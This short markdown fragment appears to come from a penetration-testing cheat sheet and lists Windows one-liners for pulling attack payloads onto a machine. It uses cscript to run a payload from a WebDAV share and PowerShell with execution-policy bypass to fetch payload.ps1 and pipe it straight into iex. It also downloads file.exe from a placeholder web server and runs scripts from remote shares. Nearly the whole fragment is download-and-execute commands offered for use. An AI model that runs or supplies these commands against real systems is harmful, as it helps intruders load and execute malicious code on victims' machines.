!!! info ""

    ```powershell
    # Execute file from a WebDav server:
    cscript //E:jscript \\IP\folder\payload.txt

    # Download using wget.vbs
    cscript wget.vbs http://IP/file.exe file.exe

    # One liner download file from WebServer:
    powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
    powershell -exec bypass -c "(new-object System.Net.WebClient).DownloadFile('http://IP/file.exe','C:\Users\user\Desktop\file.exe')"

    # Download from WebDAV Server:
    powershell -exec bypass -f \\IP\folder\payload.ps1
    ```
